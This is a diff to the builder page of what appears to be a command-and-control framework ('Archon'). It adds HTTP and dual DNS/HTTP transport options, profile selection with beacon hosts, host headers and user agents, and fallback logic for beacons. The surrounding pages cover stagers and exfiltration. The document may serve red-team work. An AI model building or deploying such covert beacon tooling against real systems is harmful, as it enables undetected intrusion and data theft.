@@ -338,6 +338,7 @@
     <div class="nav-menu">
         <a href="/dashboard" class="nav-btn">Dashboard</a>
         <a href="/builder" class="nav-btn active">Builder</a>
+        <a href="/profiles" class="nav-btn">HTTP Profiles</a>
         <a href="/stager" class="nav-btn">Stager Sessions</a>
         <a href="/exfils" class="nav-btn">Exfils</a>
         <a href="/logs" class="nav-btn">Logs</a>
@@ -458,6 +459,33 @@
                     <label class="form-label">DNS Resolver</label>
                     <input type="text" id="clientResolver" class="form-input" placeholder="Leave empty for system resolver">
                     <div class="help-text">Specify resolver IP:port (e.g., 8.8.8.8:53) or leave empty to use host's configured DNS</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Transport</label>
+                    <select id="clientTransport" class="form-select" onchange="onTransportChange()">
+                        <option value="dns">DNS only (default)</option>
+                        <option value="http">HTTP/HTTPS only</option>
+                        <option value="dual">Dual (DNS signal, HTTP tasking)</option>
+                    </select>
+                    <div class="help-text">Dual uses DNS only to signal that a task is ready; the task and its results travel over HTTP.</div>
+                </div>
+
+                <div class="form-group" id="clientTransportProfilesGroup" style="display:none;">
+                    <label class="form-label">HTTP Listeners</label>
+                    <div id="clientTransportProfiles" style="background: rgba(255, 255, 255, 0.05); padding: 10px; border-radius: 4px; min-height: 40px; color: #444;">
+                        Loading profiles...
+                    </div>
+                    <div class="help-text">Profiles stored in Archon. Each needs a beacon_host: the address beacons dial, which is usually not the listener's bind address.</div>
+                </div>
+
+                <div class="form-group" id="clientTransportFallbackGroup" style="display:none;">
+                    <label class="form-label">HTTP Fallback</label>
+                    <div class="form-row">
+                        <input type="number" id="clientFallbackAfter" class="form-input" placeholder="Failures" value="3" min="1">
+                        <input type="number" id="clientRetryBackoff" class="form-input" placeholder="Retry backoff (s)" value="60" min="1">
+                    </div>
+                    <div class="help-text">Consecutive HTTP failures before a dual-mode beacon uses DNS again, and how long before it probes HTTP again.</div>
                 </div>
 
                 <div class="advanced-toggle" onclick="toggleAdvanced('clientAdvanced')">
@@ -1053,6 +1081,106 @@
 
         // ---- Live Build Preview ----
 
+        // --- HTTP transport ---
+        let savedHTTPProfiles = [];
+
+        // Load the profiles stored in Archon so they can be picked for a build.
+        async function loadHTTPProfiles() {
+            const container = document.getElementById('clientTransportProfiles');
+            if (!container) return;
+
+            try {
+                const response = await authFetch('/api/http/profiles');
+                if (!response || !response.ok) throw new Error('request failed');
+                const payload = await response.json();
+                savedHTTPProfiles = (payload && payload.data && payload.data.profiles) || [];
+            } catch (error) {
+                savedHTTPProfiles = [];
+            }
+            renderHTTPProfilePicker();
+        }
+
+        function renderHTTPProfilePicker() {
+            const container = document.getElementById('clientTransportProfiles');
+            if (!container) return;
+
+            if (savedHTTPProfiles.length === 0) {
+                container.innerHTML = 'No profiles saved. Create one on the Profiles page first.';
+                return;
+            }
+
+            container.innerHTML = savedHTTPProfiles.map(profile => {
+                let document_ = {};
+                try { document_ = JSON.parse(profile.document) || {}; } catch (error) { document_ = {}; }
+
+                const host = document_.beacon_host || '';
+                const scheme = document_.scheme || 'https';
+                const target = host ? `${scheme}://${host}` : 'no beacon_host set';
+                const warning = host ? '' : ' <span style="color:#ff6b6b;">&#9888;</span>';
+
+                return `<label style="display:block; margin-bottom:6px; color:#eaeaea; font-size:12px; color: #eaeaea;">
+                    <input type="checkbox" class="clientTransportProfile" value="${escapeHtml(profile.name)}" style="width:14px; height:14px; margin-right:6px;">
+                    ${escapeHtml(profile.name)} <span style="color:#666;">(${escapeHtml(target)})</span>${warning}
+                </label>`;
+            }).join('');
+        }
+
+        function onTransportChange() {
+            const mode = document.getElementById('clientTransport').value;
+            document.getElementById('clientTransportProfilesGroup').style.display = mode === 'dns' ? 'none' : 'block';
+            document.getElementById('clientTransportFallbackGroup').style.display = mode === 'dual' ? 'block' : 'none';
+            updateBuildPreview();
+        }
+
+        // Build the transport fields for a client build request. Throws with an
+        // explanation rather than sending a build the beacon could not use.
+        function buildTransportRequest() {
+            const mode = document.getElementById('clientTransport').value;
+            if (mode === 'dns') {
+                return { transport: 'dns' };
+            }
+
+            const selected = Array.from(document.querySelectorAll('.clientTransportProfile:checked')).map(el => el.value);
+            if (selected.length === 0) {
+                throw new Error('Select at least one HTTP listener, or set Transport back to DNS only.');
+            }
+
+            const listeners = selected.map(name => {
+                const profile = savedHTTPProfiles.find(candidate => candidate.name === name);
+                let document_ = {};
+                try { document_ = JSON.parse(profile.document) || {}; } catch (error) { document_ = {}; }
+
+                const host = document_.beacon_host || '';
+                if (!host) {
+                    throw new Error(`Profile ${name} has no beacon_host, so the beacon has nowhere to connect.`);
+                }
+
+                return {
+                    name: name,
+                    scheme: document_.scheme || 'https',
+                    host: host,
+                    host_header: document_.host_header || '',
+                    spki_sha256: (document_.tls && document_.tls.spki_sha256) || '',
+                    uris: document_.uris || {},
+                    methods: document_.methods || {},
+                    user_agents: document_.user_agents || [],
+                    headers: document_.headers || [],
+                    request_body: document_.request_body || {},
+                    response_body: document_.response_body || {},
+                    auth: document_.auth || {},
+                    timeout_secs: document_.timeout_secs || 0,
+                    max_body_bytes: document_.max_body_bytes || 0,
+                };
+            });
+
+            const request = { transport: mode, http_listeners: listeners };
+            if (mode === 'dual') {
+                request.http_fallback_after_failures = parseInt(document.getElementById('clientFallbackAfter').value, 10) || 3;
+                request.http_retry_backoff_secs = parseInt(document.getElementById('clientRetryBackoff').value, 10) || 60;
+            }
+            return request;
+        }
+
         function updateBuildPreview() {
             const panel = document.getElementById('clientBuildPreview');
 
@@ -1402,6 +1530,7 @@
                         registration_phase: regPhase,
                         poll_phase: pollPhase,
                         data_exfil_phase: exfilPhase,
+                        ...buildTransportRequest(),
                     })
                 });
 
@@ -1508,6 +1637,7 @@
         loadDNSServers();
         loadClientBinaries();
         loadBuilds();
+        loadHTTPProfiles();
         setupForwardDNSToggle();
 
         async function loadBuilds() {
